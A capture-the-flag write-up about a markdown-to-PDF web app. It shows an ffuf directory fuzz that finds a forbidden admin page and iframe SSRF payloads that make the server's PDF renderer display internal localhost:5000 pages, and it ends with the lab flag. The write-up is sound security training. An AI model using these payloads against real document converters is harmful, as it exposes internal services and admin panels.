---
sticker: lucide//code
---

# PORT SCAN
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | SSH |
| 80 | HTTP |
| 5000 | RSTP |



# RECONNAISSANCE
---

If we check the web application, we can see this:


![Pasted image 20250617123928.png](../../IMAGES/Pasted%20image%2020250617123928.png)

As seen, we can convert markdown to pdf, this is highly vulnerable since at its core it blindly hands our Markdown straight off to a server‘side renderer, whether that's a headless browser or Pandoc+LaTeX with no filtering or authentication. 

That means we can sneak in `<script>` tags or raw LaTeX commands and make the server fetch internal URLs (like `localhost:5000/resource`) or even execute shell commands. In short, untrusted input becomes powerful SSRF or RCE, exposing private admin panels and letting attackers run arbitrary code.

If we fuzz, we can find this:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.129.226/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git,.js

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://10.10.129.226/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions : .php .html .txt .git .js
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin [Status: 403, Size: 166, Words: 15, Lines: 5, Duration: 231ms]
```

We can find an admin resource on here, if we try accessing it, this happens:

![Pasted image 20250617124337.png](../../IMAGES/Pasted%20image%2020250617124337.png)

Based on that, we now we can exploit the md2pdf site to achieve access to the admin resource, let's do it.


# EXPLOITATION
---

First of all, we need to exfiltrate the data, we can use the following payload:

```js
<iframe src="http://localhost:5000"></iframe>
```

We use iframe to achieve `SSRF`, basically the pdf engine will render the internal resource and give us access to it, let's test it out:



![Pasted image 20250617125048.png](../../IMAGES/Pasted%20image%2020250617125048.png)

![Pasted image 20250617125056.png](../../IMAGES/Pasted%20image%2020250617125056.png)

It works, let's read admin resource then:

```js
<iframe 
 src="http://localhost:5000/admin" 
 style="width:100%; height:1000px; border:none; overflow:hidden;">
</iframe>
```

![Pasted image 20250617125137.png](../../IMAGES/Pasted%20image%2020250617125137.png)

![Pasted image 20250617125144.png](../../IMAGES/Pasted%20image%2020250617125144.png)

We got our flag:

```
flag{1f4a2b6ffeaf4707c43885d704eaee4b}
```

![Pasted image 20250617125225.png](../../IMAGES/Pasted%20image%2020250617125225.png)

